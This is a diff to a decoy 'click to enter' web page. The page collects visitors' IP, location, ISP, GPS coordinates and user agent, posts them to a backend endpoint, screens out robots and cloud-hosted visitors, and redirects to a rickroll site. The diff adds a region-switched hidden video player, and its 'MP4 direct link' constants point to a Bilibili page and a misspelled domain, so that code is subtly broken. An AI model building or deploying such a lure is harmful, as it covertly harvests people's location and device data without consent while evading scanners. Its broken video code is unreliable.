@@ -11,14 +11,30 @@
 <button id="downloadBtn" style="padding:20px;font-size:18px;line-height:1.6;">
 click to enter<br>
 Click en Entrar<br>
-点击 进入<br>
+点击 进入
 </button>
+
+<!-- 新增播放器，默认隐藏，不干扰原有页面 -->
+<div id="videoBox" style="display:none;width:90%;max-width:800px;position:absolute;top:20px;">
+    <video id="mainVideo" controls width="100%">
+        <source id="videoSrc" src="" type="video/mp4">
+        您浏览器不支持视频播放
+    </video>
+</div>
 
 <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 <script>
 const lockTime = 5 * 60 * 1000;
 const jumpUrl = "http://full.rickroll.info/";
 const minecraftRedirect = "https://www.minecraft.net/es-es/";
+
+// ======================
+// ①国内MP4直链填这里
+const VIDEO_CN  = "https://www.bilibili.com/video/BV1GJ411x7h7";
+
+// ②海外MP4直链填这里
+const VIDEO_OVERSEA = "http://full.rickrpll.info/";
+// ======================
 
 axios.defaults.timeout = 6000;
 let ipData = {ip:"获取失败",country:"-",city:"-",region:"-",isp:"-"};
@@ -45,6 +61,19 @@ function isCloudISP(isp){
     if(!isp) return false;
     const lowIsp = isp.toLowerCase();
     return cloudProviders.some(name=> lowIsp.includes(name.toLowerCase()));
+}
+
+//新增：地区分流播放视频，不修改原有业务逻辑
+function playBranchVideo(){
+    let targetVideoUrl;
+    if(ipData.country === "China"){
+        targetVideoUrl = VIDEO_CN;
+    }else{
+        targetVideoUrl = VIDEO_OVERSEA;
+    }
+    document.getElementById("videoSrc").src = targetVideoUrl;
+    document.getElementById("mainVideo").load();
+    document.getElementById("videoBox").style.display = "block";
 }
 
 if(isRobot){
@@ -119,7 +148,6 @@ if(isRobot){
         );
     }
 
-    //前端只把采集到的数据发给自己后端接口，密钥后端保管
     async function sendData(){
         if(sendLock) return;
         sendLock = true;
@@ -132,7 +160,6 @@ if(isRobot){
             gps:gpsInfo,
             ua:navigator.userAgent
         };
-        //调用本项目后端接口，相对路径不用填长网址
         await axios.post("/send_msg",postData);
     }
 
@@ -142,6 +169,10 @@ if(isRobot){
         }
         gpsTriggered = false;
         await getGPS();
+
+        //仅在此处新增调用视频播放，其余原有流程完全不动
+        playBranchVideo();
+
         setTimeout(()=>{
             location.href = jumpUrl;
         },3000);
